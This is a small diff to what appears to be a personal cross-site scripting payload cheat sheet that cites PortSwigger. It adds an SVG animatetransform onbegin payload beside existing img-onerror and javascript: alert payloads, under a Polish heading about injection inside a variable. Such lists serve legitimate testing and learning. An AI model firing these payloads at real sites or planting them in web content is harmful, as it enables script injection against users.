@@ -8,6 +8,7 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 <img src=1 onerror=alert(1)>
 javascript:alert('You are hacked!')
 <><img src=1 onerror=alert(1)>
+"><svg><animatetransform onbegin='alert(1);'>
 
 ***********************************************************************************************************************************************************
 [Wstrzykciecie w srodku zmiennej]
